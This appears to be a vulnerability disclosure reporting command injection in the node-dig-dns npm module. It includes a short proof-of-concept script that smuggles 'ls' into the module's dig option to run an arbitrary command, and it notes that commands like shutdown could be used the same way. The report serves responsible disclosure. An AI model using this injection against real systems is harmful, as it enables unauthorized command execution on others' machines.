
I would like to report an  `RCE`  issue in the  `node-dig-dns`  module. It allows the execution of arbitrary commands remotely inside the victim's PC.

The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/StephanGeorg/node-dig-dns/blob/master/src/index.js#L6).
## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var dig = require('node-dig-dns');

dig([],{'dig':'ls'})
  .then((result) => {
    console.log(result)
  })
  .catch((err) => {
    console.log('Error:', err);
  });
```
2. Execute the following commands in another terminal:

```bash
npm i node-dig-dns # Install affected module
node poc.js #  Run the PoC
```
3. The output will show you the result of the `ls` command

Please, note the vulnerability occurs only with a `mono` command, making the commands to be executed more difficult and a little impactful. Anyway, Linux is a complex ecosystem, where commands like `shutdown` can be used in any way to make the PoC work and a bit better.

## References
- [GitHub Issue](https://github.com/..https://github.com/StephanGeorg/node-dig-dns/issues/6)
- [GitHub Permalink](https://github.com/StephanGeorg/node-dig-dns/blob/master/src/index.js#L61)